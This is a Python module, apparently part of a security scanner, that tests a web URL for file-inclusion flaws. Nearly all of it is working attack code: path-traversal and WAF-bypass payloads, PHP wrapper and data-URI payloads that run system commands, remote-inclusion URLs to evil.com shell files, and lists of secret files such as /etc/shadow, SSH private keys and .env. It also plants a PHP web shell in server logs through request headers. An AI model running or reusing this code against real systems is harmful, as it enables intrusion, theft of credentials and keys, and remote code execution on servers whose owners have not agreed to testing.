"""Deep LFI/RFI detection — PHP wrappers, null byte, path traversal, log poisoning, encoding bypass."""

import httpx
import re
import urllib.parse
import asyncio
import base64

# --- Path Traversal Payloads (Linux) ---
LINUX_TRAVERSAL = [
    ("basic_2", "../../../etc/passwd"),
    ("basic_4", "../../../../../../etc/passwd"),
    ("basic_6", "../../../../../../../../etc/passwd"),
    ("basic_deep", "../../../../../../../../../../../../etc/passwd"),
    ("encoded_2", "..%2f..%2f..%2fetc/passwd"),
    ("encoded_4", "..%2f..%2f..%2f..%2f..%2fetc/passwd"),
    ("double_encoded", "..%252f..%252f..%252fetc/passwd"),
    ("utf8", "..%c0%af..%c0%af..%c0%afetc/passwd"),
    ("utf8_overlong", "..%c0%ae%c0%ae%c0%aeetc/passwd"),
    ("backslash", "..\\..\\..\\etc\\passwd"),
    ("mixed_separator", "..%252f..%252f..%255cetc/passwd"),
    ("null_byte", "../../../etc/passwd%00"),
    ("null_byte_ext", "../../../etc/passwd%00.jpg"),
    ("null_byte_php", "../../../etc/passwd%00.php"),
    ("double_null", "../../../etc/passwd%00%00"),
    ("semicolon", "../../../etc/passwd;"),
    ("pipe", "../../../etc/passwd|"),
    ("backtick", "../../../etc/passwd`"),
    ("dollar", "../../../etc/passwd$"),
    ("newline", "../../../etc/passwd%0a"),
    ("carriage_return", "../../../etc/passwd%0d"),
    ("tab", "../../../etc/passwd%09"),
    ("dot_traversal", "....//....//....//etc/passwd"),
    ("double_dot", "..../..../..../etc/passwd"),
    ("unicode_dot", "‥/‥/‥/etc/passwd"),
]

# --- Path Traversal Payloads (Windows) ---
WINDOWS_TRAVERSAL = [
    ("basic_win", "..\\..\\..\\windows\\win.ini"),
    ("basic_win_fwd", "../../../windows/win.ini"),
    ("encoded_win", "..%2f..%2f..%2fwindows/win.ini"),
    ("null_win", "..\\..\\..\\windows\\win.ini%00"),
    ("null_win_ext", "..\\..\\..\\windows\\win.ini%00.txt"),
    ("boot_ini", "..\\..\\..\\boot.ini"),
    ("system_ini", "..\\..\\..\\windows\\system.ini"),
]

# --- PHP Wrappers (Critical) ---
PHP_WRAPPERS = [
    ("php_input", "php://input", "POST body execution"),
    ("php_filter_b64", "php://filter/convert.base64-encode/resource=index", "Source code disclosure via base64"),
    ("php_filter_b64_full", "php://filter/convert.base64-encode/resource=/etc/passwd", "File read via base64"),
    ("php_filter_convert", "php://filter/read=convert.base64-encode/resource=index", "Source code read"),
    ("php_data_text", "data://text/plain,<?php system('id') ?>", "Code execution via data wrapper"),
    ("php_data_b64", "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpID8+", "Code execution via base64 data"),
    ("php_expect", "expect://id", "Command execution via expect wrapper"),
    ("php_glob", "glob:///etc/p*", "File enumeration via glob"),
    ("php_zip", "zip:///tmp/uploaded.jpg#shell.php", "Zip wrapper for code exec"),
    ("phar_wrapper", "phar:///tmp/test.zip/shell.php", "Phar deserialization"),
    ("php_filter_chain", "php://filter/convert.iconv.utf-8.utf-16be/convert.quoted-printable-encode/resource=/etc/passwd", "Filter chain attack"),
    ("php_filter_destruct", "php://filter/convert.base64-decode/resource=php://input", "Destructive filter chain"),
]

# --- RFI Payloads ---
RFI_PAYLOADS = [
    ("rfi_http", "http://evil.com/shell.txt"),
    ("rfi_http_ext", "http://evil.com/shell.txt?"),
    ("rfi_http_null", "http://evil.com/shell.txt%00"),
    ("rfi_php", "http://evil.com/shell.php"),
    ("rfi_data", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4="),
]

# --- Log Poisoning Payloads ---
LOG_POISONING = [
    ("user_agent", "User-Agent", "<?php system($_GET['cmd']); ?>"),
    ("referer", "Referer", "<?php system($_GET['cmd']); ?>"),
    ("x_forwarded_for", "X-Forwarded-For", "<?php system($_GET['cmd']); ?>"),
    ("x_forwarded_host", "X-Forwarded-Host", "<?php system($_GET['cmd']); ?>"),
    ("accept_language", "Accept-Language", "<?php system($_GET['cmd']); ?>"),
    ("cookie", "Cookie", "<?php system($_GET['cmd']); ?>"),
    ("authorization", "Authorization", "<?php system($_GET['cmd']); ?>"),
]

# --- Sensitive Files ---
SENSITIVE_FILES = [
    ("/etc/passwd", "root:", "Linux user database"),
    ("/etc/shadow", "root:", "Linux password hashes"),
    ("/etc/hosts", "localhost", "Host configuration"),
    ("/etc/hostname", "", "System hostname"),
    ("/etc/os-release", "VERSION", "OS version info"),
    ("/etc/resolv.conf", "nameserver", "DNS configuration"),
    ("/etc/crontab", "root", "System crontab"),
    ("/proc/self/environ", "PATH", "Process environment"),
    ("/proc/self/cmdline", "cmdline", "Process command line"),
    ("/proc/version", "Linux version", "Kernel version"),
    ("/proc/net/tcp", "local_address", "Network connections"),
    ("/proc/self/fd/0", "", "File descriptor"),
    ("/var/log/apache2/access.log", "GET", "Apache access log"),
    ("/var/log/apache2/error.log", "error", "Apache error log"),
    ("/var/log/nginx/access.log", "GET", "Nginx access log"),
    ("/var/log/nginx/error.log", "error", "Nginx error log"),
    ("/var/log/auth.log", "authentication", "Auth log"),
    ("/var/log/syslog", "", "System log"),
    ("/var/log/mail.log", "", "Mail log"),
    ("/home/.bash_history", "", "Bash history"),
    ("/root/.bash_history", "", "Root bash history"),
    ("/home/.ssh/id_rsa", "BEGIN", "SSH private key"),
    ("/root/.ssh/id_rsa", "BEGIN", "Root SSH private key"),
    ("/home/.ssh/authorized_keys", "ssh-", "SSH authorized keys"),
    ("/etc/mysql/my.cnf", "[mysqld]", "MySQL config"),
    ("/etc/ssh/sshd_config", "Port", "SSH config"),
    ("/etc/sudoers", "root", "Sudo configuration"),
    ("/etc/httpd/conf/httpd.conf", "ServerRoot", "Apache config"),
    ("/wp-config.php", "DB_", "WordPress config"),
    ("/config.php", "password", "PHP config"),
    ("/configuration.php", "password", "Joomla config"),
    ("/settings.py", "DATABASE", "Django settings"),
    ("/.env", "APP_KEY", "Environment variables"),
    ("/config/database.yml", "password", "Rails database config"),
    ("/application.properties", "datasource", "Spring config"),
    ("/web.config", "connectionString", ".NET config"),
    ("/pom.xml", "groupId", "Maven config"),
    ("/package.json", "name", "Node.js package"),
    ("/Gemfile", "gem", "Ruby Gemfile"),
    ("/requirements.txt", "", "Python dependencies"),
    ("/composer.json", "name", "PHP Composer"),
    ("/docker-compose.yml", "services", "Docker compose"),
    ("/Dockerfile", "FROM", "Docker file"),
    ("/.git/config", "[remote", "Git config"),
    ("/.git/HEAD", "ref:", "Git HEAD"),
    ("/.svn/entries", "", "SVN entries"),
    ("/.hg/dirstate", "", "Mercurial dirstate"),
]

# --- Windows Files ---
WINDOWS_FILES = [
    ("/windows/win.ini", "[extensions]", "Windows INI file"),
    ("/windows/system.ini", "[drivers]", "Windows system INI"),
    ("/boot.ini", "[boot loader]", "Boot configuration"),
    ("/windows/system32/drivers/etc/hosts", "localhost", "Windows hosts file"),
    ("/windows/system32/config/SAM", "", "Windows SAM database"),
    ("/windows/system32/config/system", "", "Windows system registry"),
    ("/inetpub/wwwroot/web.config", "connectionString", "IIS config"),
]


def _detect_os(body: str) -> str:
    """Detect target OS from response content."""
    linux_indicators = ["root:x:0:0", "/etc/passwd", "bin/bash", "bin/sh"]
    windows_indicators = ["[extensions]", "[boot loader]", "[fonts]", "Microsoft Windows"]

    for ind in linux_indicators:
        if ind in body:
            return "linux"
    for ind in windows_indicators:
        if ind in body:
            return "windows"
    return "unknown"


def _waf_bypass_variants(payload: str) -> list[str]:
    """Generate WAF bypass variants."""
    variants = [payload]

    # URL encoding
    variants.append(urllib.parse.quote(payload, safe=""))

    # Double encoding
    variants.append(urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""))

    # Null byte variations
    if "%00" not in payload:
        variants.append(payload + "%00")
        variants.append(payload + "%00.jpg")
        variants.append(payload + "%00.php")

    # Case variation
    modified = payload
    for char in ["e", "t", "c"]:
        modified = modified.replace(char, char.upper())
    if modified != payload:
        variants.append(modified)

    # Dot variation
    variants.append(payload.replace("..", "...."))
    variants.append(payload.replace("..", "..%252f"))

    return variants


async def lfi_detect(target: str, param: str = "") -> dict:
    """Deep LFI/RFI detection with PHP wrappers, path traversal, and log poisoning."""
    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    parsed = urllib.parse.urlparse(target)
    params = urllib.parse.parse_qs(parsed.query)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    test_params = [param] if param else list(params.keys()) if params else [
        "file", "page", "path", "include", "doc", "view", "load", "read",
        "cat", "show", "display", "content", "template", "module", "action",
        "name", "dir", "folder", "upload", "download", "img", "image",
        "style", "css", "js", "javascript", "pdf", "resource",
    ]

    results = []
    detected_os = "unknown"
    working_param = None

    async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=False) as client:
        # Get baseline
        try:
            baseline_resp = await client.get(base)
            baseline_len = len(baseline_resp.text)
        except Exception:
            baseline_len = 0

        for p in test_params:
            if working_param and working_param != p:
                continue  # Skip if we already found a working param

            # --- Basic Traversal ---
            for name, payload in LINUX_TRAVERSAL + WINDOWS_TRAVERSAL:
                variants = _waf_bypass_variants(payload)
                for variant in variants[:3]:
                    try:
                        url = f"{base}?{p}={urllib.parse.quote(variant, safe='')}"
                        resp = await client.get(url)
                        body = resp.text
                        body_lower = body.lower()

                        indicators = []
                        if "root:x:0:0" in body:
                            indicators.append("linux_passwd_leak")
                        if "[extensions]" in body_lower:
                            indicators.append("windows_ini_leak")
                        if "[boot loader]" in body_lower:
                            indicators.append("boot_ini_leak")
                        if "bin/bash" in body or "bin/sh" in body:
                            indicators.append("shell_reference")
                        if re.search(r"root:.*:0:0:", body):
                            indicators.append("passwd_entry_format")

                        if indicators:
                            os_type = _detect_os(body)
                            results.append({
                                "technique": "path_traversal",
                                "param": p,
                                "payload": name,
                                "payload_value": variant[:100],
                                "os_type": os_type,
                                "indicators": indicators,
                                "evidence": body[:300],
                                "status": resp.status_code,
                                "risk": "CRITICAL",
                                "confidence": "high",
                            })
                            detected_os = os_type
                            working_param = p
                            break
                    except Exception:
                        continue
                if working_param == p:
                    break

            # --- PHP Wrapper Exploitation ---
            for name, payload, description in PHP_WRAPPERS:
                try:
                    url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
                    resp = await client.get(url)
                    body = resp.text

                    wrapper_indicators = []
                    if name.startswith("php_filter") and len(body) > 50:
                        # Try to decode base64
                        try:
                            decoded = base64.b64decode(body.strip()).decode("utf-8", errors="replace")
                            if "<?php" in decoded or "root:" in decoded or "<html" in decoded.lower():
                                wrapper_indicators.append("base64_source_code_leak")
                                body = decoded[:500]
                        except Exception:
                            pass

                    if name == "php_input":
                        wrapper_indicators.append("php_input_accessible")
                    if name == "php_data_text" or name == "php_data_b64":
                        wrapper_indicators.append("data_wrapper_accessible")
                    if name == "php_expect":
                        wrapper_indicators.append("expect_wrapper_accessible")
                    if "root:" in body:
                        wrapper_indicators.append("file_read_confirmed")
                    if "<?php" in body:
                        wrapper_indicators.append("source_code_disclosure")

                    if wrapper_indicators:
                        results.append({
                            "technique": "php_wrapper",
                            "param": p,
                            "wrapper": name,
                            "payload": payload,
                            "description": description,
                            "indicators": wrapper_indicators,
                            "evidence": body[:300] if "source_code" not in str(wrapper_indicators) else "[source code disclosed]",
                            "status": resp.status_code,
                            "risk": "CRITICAL",
                            "confidence": "high",
                        })
                        working_param = p
                except Exception:
                    continue

            # --- Sensitive File Discovery ---
            if not working_param:
                for file_path, indicator, description in SENSITIVE_FILES + WINDOWS_FILES:
                    try:
                        url = f"{base}?{p}={urllib.parse.quote(file_path, safe='')}"
                        resp = await client.get(url)
                        body = resp.text

                        if indicator and indicator in body and len(body) > 50:
                            results.append({
                                "technique": "sensitive_file_read",
                                "param": p,
                                "file": file_path,
                                "description": description,
                                "indicator": indicator,
                                "evidence": body[:200],
                                "status": resp.status_code,
                                "risk": "CRITICAL" if any(kw in file_path for kw in ["shadow", "id_rsa", "password", ".env", "config"]) else "HIGH",
                                "confidence": "high",
                            })
                            working_param = p
                            break
                    except Exception:
                        continue

            # --- RFI Detection ---
            for name, payload in RFI_PAYLOADS:
                try:
                    url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
                    resp = await client.get(url, timeout=10.0)
                    body = resp.text

                    if resp.status_code == 200 and len(body) > 50:
                        results.append({
                            "technique": "rfi",
                            "param": p,
                            "payload": name,
                            "url": payload,
                            "status": resp.status_code,
                            "response_size": len(body),
                            "risk": "CRITICAL",
                            "confidence": "medium",
                        })
                        working_param = p
                        break
                except Exception:
                    continue

            # --- Log Poisoning Test ---
            if working_param == p:
                for header_name, header_field, poison_payload in LOG_POISONING:
                    try:
                        # Inject payload via header
                        await client.get(base, headers={header_field: poison_payload})

                        # Try to read log file
                        log_paths = [
                            "/var/log/apache2/access.log",
                            "/var/log/nginx/access.log",
                            "/var/log/auth.log",
                            "/var/log/syslog",
                        ]
                        for log_path in log_paths:
                            url = f"{base}?{p}={urllib.parse.quote(log_path, safe='')}"
                            resp = await client.get(url)
                            if poison_payload[:20] in resp.text:
                                results.append({
                                    "technique": "log_poisoning",
                                    "param": p,
                                    "header": header_field,
                                    "log_file": log_path,
                                    "note": f"Payload injected via {header_field} header and read from {log_path}",
                                    "risk": "CRITICAL",
                                    "confidence": "high",
                                })
                                break
                    except Exception:
                        continue

    return {
        "target": target,
        "params_tested": test_params,
        "detected_os": detected_os,
        "working_param": working_param,
        "results": results,
        "vulnerable": len(results) > 0,
        "total_findings": len(results),
        "techniques_found": list(set(r["technique"] for r in results)),
        "risk_summary": {
            "critical": sum(1 for r in results if r.get("risk") == "CRITICAL"),
            "high": sum(1 for r in results if r.get("risk") == "HIGH"),
            "medium": sum(1 for r in results if r.get("risk") == "MEDIUM"),
        },
    }
